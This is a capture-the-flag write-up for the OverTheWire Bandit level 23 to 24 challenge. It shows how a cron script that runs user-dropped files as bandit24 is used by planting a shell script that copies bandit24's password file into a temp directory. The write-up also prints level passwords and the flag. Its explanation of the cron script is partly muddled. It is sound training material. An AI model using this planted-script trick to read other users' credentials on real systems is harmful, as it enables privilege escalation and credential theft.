# CTF Writeup - **OverTheWire Bandit23 - Bandit24**

**Author**: spiketyson  

---

## Challenge Details

- **Challenge Name:** Bandit23 - Bandit24
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 22-11-2024

---

## Summary

This challenge is the level23 for the Bandit series on OverTheWire, focusing on basic Linux command-line skills. A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.  This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!. Keep in mind that your shell script is removed once executed, so you may want to keep a copy around
---

## Approach

Since this is an easy challenge, I planned to use basic Linux commands like `ls`, `cat`, `cd`,`mktemp` to explore the server and retrieve the flag.

---

## Solution Walkthrough

Connect to the server using the `ssh` command as below:

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
# Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

After logging in, Lets explore the `/etc/cron.d` directory using ls command as shown below.

```bash
ls -la /etc/cron.d
# Output: 
# total 44
# drwxr-xr-x   2 root root  4096 Sep 19 07:10 .
# drwxr-xr-x 121 root root 12288 Sep 20 18:37 ..
# -rw-r--r--   1 root root   120 Sep 19 07:08 cronjob_bandit22
# -rw-r--r--   1 root root   122 Sep 19 07:08 cronjob_bandit23
# -rw-r--r--   1 root root   120 Sep 19 07:08 cronjob_bandit24
# -rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
# -rwx------   1 root root    52 Sep 19 07:10 otw-tmp-dir
# -rw-r--r--   1 root root   102 Mar 31  2024 .placeholder
# -rw-r--r--   1 root root   396 Jan  9  2024 sysstat
```

Here we can find a file related to `bandit24`. As we are looking for `bandit24` password `cronjob_bandit24` seems interesting. lets see the contents of the file.  

```bash
cat cronjob_bandit24
# @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
# * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Cronjobs are programs run automatically at regular intervals. In Linux, there are multiple folders that can contain these cronjobs. We know that at regular interval `cronjob_bandit24` is being executed. Here we can see that `cronjob_bandit24` is executing the file `/usr/bin/cronjob_bandit24.sh`
Lets see the contents of this file. 

```bash
cat /usr/bin/cronjob_bandit24.sh
# #!/bin/bash
# myname=$(whoami)
# cd /var/spool/$myname/foo
# echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
# for i in * .*;
# do
#     if [ "$i" != "." -a "$i" != ".." ];
#     then
#         echo "Handling $i"
#         owner="$(stat --format "%U" ./$i)"
#         if [ "${owner}" = "bandit23" ]; then
#             timeout -s 9 60 ./$i
#         fi
#         rm -f ./$i
#     fi
# done
```

It looks like the `cronjob_bandit24.sh` is getting the current user information by execution `whoami` which in our case will be `bandit23`, with this name it moves a directory `/var/spool/bandit23/foo` in our case. Tries executing all the files that are present in the directory and the removes all the files in that directory so that no one can copy them. The idea here is that we can execute a script as `bandit24` if its copied to that location. Lets create a script that copies `bandit24` password and copies it to a text file in our temp directory. But this is only possible if it is executed by `bandit24`. First we need to create a temporary directory as we dont have permission to create any files in the local.  


```bash
mktemp -d 
# /tmp/tmp.KSblvOUbhU
cd /tmp/tmp.KSblvOUbhU
nano bandit24_password.sh
# #!/bin/bash
# cat /etc/bandit_pass/bandit24 > /tmp/tmp.KSblvOUbhU/password.txt
chmod 777 bandit24_password.sh
cp bandit24_password.sh /var/spool/bandit24/foo
```

We can see that aftere creating the file we need to make the file executable by giving necessary permissions. We can do that be using `chmod` as shown above. Then we need to copy this file to `/var/spool/bandit24/foo` as this is where the cronjob executes all the files with `bandit24` as owner in the directory and removes them. Once we can copied, we need to wait for 2 mins after that we can see a passowrd.txt file being created in our tempdirectory. Now we can explore the flag using `cat` command.

```bash
cat password.txt
# FLAG{gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8}
```

---

## Flag

**Flag:**  gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

---

## Lessons Learned
It was a good challenge that made me think how i should think like an attacker and how to exploit privelages.